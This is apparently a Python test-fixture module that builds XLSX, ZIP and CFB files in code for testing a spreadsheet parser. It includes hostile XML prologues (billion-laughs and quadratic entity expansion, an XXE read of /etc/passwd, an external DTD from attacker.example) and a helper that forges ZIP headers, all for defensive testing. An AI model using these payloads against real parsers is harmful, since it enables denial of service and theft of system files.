"""Spreadsheets and containers built in code (XLSX parts as XML strings, ZIP, CFB, CSV).

Nothing binary is committed (M1 plan). `make_xlsx` writes the package parts by hand, so a
test controls every attribute (hidden rows, uncached formulas, hostile XML);
`make_openpyxl_xlsx` writes a realistic workbook with openpyxl (dates, number formats).
"""

import io
import struct
import zipfile
from collections.abc import Iterable, Sequence
from dataclasses import dataclass
from typing import Any
from xml.sax.saxutils import escape, quoteattr

import openpyxl

NS = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
REL_NS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
PKG_REL_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
CT_NS = "http://schemas.openxmlformats.org/package/2006/content-types"
XLSX_MAIN = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"
XLSM_MAIN = "application/vnd.ms-excel.sheet.macroEnabled.main+xml"
XLTX_MAIN = "application/vnd.openxmlformats-officedocument.spreadsheetml.template.main+xml"
SHEET_CT = "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"
STRINGS_CT = "application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"
XML_DECL = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'

# Hostile XML prologues (T5): entity expansion and external references.
BILLION_LAUGHS = (
    '<?xml version="1.0"?>\n<!DOCTYPE lolz [<!ENTITY lol "lol">'
    '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
    '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
    '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">'
    '<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">'
    '<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">'
    '<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">'
    '<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">'
    '<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]>\n'
)
QUADRATIC = '<?xml version="1.0"?>\n<!DOCTYPE q [<!ENTITY a "' + "x" * 50_000 + '">]>\n'
XXE_FILE = '<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
XXE_DTD = '<?xml version="1.0"?>\n<!DOCTYPE x SYSTEM "http://attacker.example/evil.dtd">\n'
HOSTILE_PROLOGUES = {
    "billion_laughs": (BILLION_LAUGHS, "&lol9;"),
    "quadratic": (QUADRATIC, "&a;" * 2_000),
    "xxe_file": (XXE_FILE, "&xxe;"),
    "xxe_dtd": (XXE_DTD, ""),
}


def inline(ref: str, text: str) -> str:
    return f'<c r="{ref}" t="inlineStr"><is><t xml:space="preserve">{escape(text)}</t></is></c>'


def number(ref: str, value: str, style: int | None = None) -> str:
    s = "" if style is None else f' s="{style}"'
    return f'<c r="{ref}"{s}><v>{value}</v></c>'


def shared(ref: str, index: int) -> str:
    return f'<c r="{ref}" t="s"><v>{index}</v></c>'


def formula(ref: str, text: str, cached: str | None) -> str:
    v = "" if cached is None else f"<v>{cached}</v>"
    return f'<c r="{ref}"><f>{escape(text)}</f>{v}</c>'


def row(number_: int, *cells: str, attrs: str = "") -> str:
    return f'<row r="{number_}"{attrs}>{"".join(cells)}</row>'


def text_rows(rows: Sequence[Sequence[str | None]], first: int = 1) -> str:
    """Rows of inline strings; None leaves the cell out."""
    out = []
    for offset, values in enumerate(rows):
        number_ = first + offset
        cells = [
            inline(f"{openpyxl.utils.get_column_letter(col + 1)}{number_}", value)
            for col, value in enumerate(values)
            if value is not None
        ]
        out.append(row(number_, *cells))
    return "".join(out)


def sheet_xml(rows_xml: str, *, cols: str = "", prologue: str = XML_DECL, extra: str = "") -> str:
    cols_xml = f"<cols>{cols}</cols>" if cols else ""
    return (
        f'{prologue}<worksheet xmlns="{NS}" xmlns:r="{REL_NS}">{cols_xml}'
        f"<sheetData>{rows_xml}</sheetData>{extra}</worksheet>"
    )


@dataclass(frozen=True)
class Sheet:
    name: str
    xml: str
    state: str = "visible"


def make_zip(
    entries: Iterable[tuple[str, bytes | str]], *, method: int = zipfile.ZIP_DEFLATED
) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", method) as archive:
        for name, payload in entries:
            archive.writestr(name, payload)
    return buffer.getvalue()


def make_xlsx(
    sheets: Sequence[Sheet] | None = None,
    *,
    shared_strings: Sequence[str] | None = None,
    main_type: str = XLSX_MAIN,
    content_types: str | None = None,
    workbook: str | None = None,
    strings_xml: str | None = None,
    extra: Iterable[tuple[str, bytes | str]] = (),
    workbook_rels_extra: str = "",
    workbook_extra: str = "",
) -> bytes:
    sheets = sheets if sheets is not None else [Sheet("PO", sheet_xml(text_rows([["x"]])))]
    overrides = [f'<Override PartName="/xl/workbook.xml" ContentType="{main_type}"/>']
    sheet_entries = []
    rels = []
    for index, sheet in enumerate(sheets, start=1):
        overrides.append(
            f'<Override PartName="/xl/worksheets/sheet{index}.xml" ContentType="{SHEET_CT}"/>'
        )
        state = "" if sheet.state == "visible" else f' state="{sheet.state}"'
        sheet_entries.append(
            f'<sheet name={quoteattr(sheet.name)} sheetId="{index}"{state} r:id="rId{index}"/>'
        )
        rels.append(
            f'<Relationship Id="rId{index}" Type="{REL_NS}/worksheet" '
            f'Target="worksheets/sheet{index}.xml"/>'
        )
    parts: list[tuple[str, bytes | str]] = []
    if shared_strings is not None or strings_xml is not None:
        overrides.append(f'<Override PartName="/xl/sharedStrings.xml" ContentType="{STRINGS_CT}"/>')
        rels.append(
            f'<Relationship Id="rIdS" Type="{REL_NS}/sharedStrings" Target="sharedStrings.xml"/>'
        )
        if strings_xml is None:
            items = "".join(
                f'<si><t xml:space="preserve">{escape(s)}</t></si>' for s in shared_strings or ()
            )
            strings_xml = f'{XML_DECL}<sst xmlns="{NS}">{items}</sst>'
        parts.append(("xl/sharedStrings.xml", strings_xml))
    if content_types is None:
        content_types = (
            f'{XML_DECL}<Types xmlns="{CT_NS}">'
            '<Default Extension="rels" '
            'ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            f"{''.join(overrides)}</Types>"
        )
    if workbook is None:
        workbook = (
            f'{XML_DECL}<workbook xmlns="{NS}" xmlns:r="{REL_NS}">'
            f"<sheets>{''.join(sheet_entries)}</sheets>{workbook_extra}</workbook>"
        )
    package_rels = (
        f'{XML_DECL}<Relationships xmlns="{PKG_REL_NS}">'
        f'<Relationship Id="rId1" Type="{REL_NS}/officeDocument" Target="xl/workbook.xml"/>'
        "</Relationships>"
    )
    workbook_rels = (
        f'{XML_DECL}<Relationships xmlns="{PKG_REL_NS}">{"".join(rels)}{workbook_rels_extra}'
        "</Relationships>"
    )
    entries: list[tuple[str, bytes | str]] = [
        ("[Content_Types].xml", content_types),
        ("_rels/.rels", package_rels),
        ("xl/workbook.xml", workbook),
        ("xl/_rels/workbook.xml.rels", workbook_rels),
        *((f"xl/worksheets/sheet{i}.xml", s.xml) for i, s in enumerate(sheets, start=1)),
        *parts,
        *extra,
    ]
    return make_zip(entries)


def make_openpyxl_xlsx(
    rows: Sequence[Sequence[Any]], *, formats: dict[str, str] | None = None
) -> bytes:
    """A workbook written by openpyxl itself; `formats` maps a cell ref to a number format."""
    workbook = openpyxl.Workbook()
    sheet = workbook.active
    assert sheet is not None
    sheet.title = "PO"
    for values in rows:
        sheet.append(list(values))
    for ref, number_format in (formats or {}).items():
        sheet[ref].number_format = number_format
    buffer = io.BytesIO()
    workbook.save(buffer)
    return buffer.getvalue()


_CENTRAL_HEADER = b"PK\x01\x02"


def patch_central_directory(
    data: bytes,
    name: str,
    *,
    flags: int | None = None,
    method: int | None = None,
    size: int | None = None,
) -> bytes:
    """Rewrites one central-directory field of entry `name` (a lying or hostile header)."""
    raw = bytearray(data)
    encoded = name.encode()
    position = raw.find(_CENTRAL_HEADER)
    while position >= 0:
        name_length = struct.unpack_from("<H", raw, position + 28)[0]
        if bytes(raw[position + 46 : position + 46 + name_length]) == encoded:
            if flags is not None:
                struct.pack_into("<H", raw, position + 8, flags)
            if method is not None:
                struct.pack_into("<H", raw, position + 10, method)
            if size is not None:
                struct.pack_into("<I", raw, position + 24, size)
            return bytes(raw)
        position = raw.find(_CENTRAL_HEADER, position + 4)
    raise AssertionError("entry not found")


_END = 0xFFFFFFFE
_FREE = 0xFFFFFFFF
_FAT_SECTOR = 0xFFFFFFFD


def _dir_entry(name: str, kind: int) -> bytes:
    encoded = (name + "\0").encode("utf-16-le")
    entry = bytearray(128)
    entry[: len(encoded)] = encoded
    struct.pack_into("<H", entry, 0x40, len(encoded))
    entry[0x42] = kind
    struct.pack_into("<III", entry, 0x44, _FREE, _FREE, _FREE)
    return bytes(entry)


def make_cfb(stream_names: Sequence[str]) -> bytes:
    """A minimal CFB (OLE2) file, 512-byte sectors: one FAT sector, then the directory."""
    entries = [_dir_entry("Root Entry", 5), *(_dir_entry(n, 2) for n in stream_names)]
    while len(entries) % 4:
        entries.append(bytes(128))
    directory_sectors = len(entries) // 4
    fat = [_FAT_SECTOR]
    for index in range(directory_sectors):
        fat.append(index + 2 if index + 1 < directory_sectors else _END)
    fat += [_FREE] * (128 - len(fat))
    header = bytearray(512)
    header[:8] = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
    struct.pack_into("<HHHHH", header, 0x18, 0x3E, 3, 0xFFFE, 9, 6)
    struct.pack_into("<IIII", header, 0x28, 0, 1, 1, 0)
    struct.pack_into("<IIIII", header, 0x38, 4096, _END, 0, _END, 0)
    difat = [0] + [_FREE] * 108
    struct.pack_into("<109I", header, 0x4C, *difat)
    return bytes(header) + struct.pack("<128I", *fat) + b"".join(entries)
